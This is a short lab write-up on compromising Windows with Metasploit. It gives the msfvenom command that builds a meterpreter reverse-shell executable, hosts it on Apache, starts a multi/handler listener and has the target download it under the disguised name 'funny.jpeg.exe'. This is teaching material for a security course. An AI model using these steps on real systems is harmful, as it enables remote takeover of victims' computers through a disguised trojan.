# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
PROGRAM:
Find the attackers ip address using ifconfig

OUTPUT:
![Screenshot 2025-05-12 040709](https://github.com/user-attachments/assets/72cde6fd-e50e-44c7-a485-148a28b88956)


Create a malicious executable file fun.exe using msfvenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe copy the fun.exe into the apache /var/www/html folder Start apache server sudo systemctl apache2 start

Invoke msfconsole:

OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


![Screenshot 2025-05-12 040728](https://github.com/user-attachments/assets/6766e878-802a-4ff5-9eca-746cc1e8c93c)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![Screenshot 2025-05-12 040739](https://github.com/user-attachments/assets/9cf19cb1-2fee-42a0-be1a-cc5226a0e89b)
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.149.243/funny.jpeg.exe The file "fun.exe" downloads.
![Screenshot 2025-05-12 040753](https://github.com/user-attachments/assets/d03182eb-5968-4c4d-94a8-e32ebd1fed56)



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
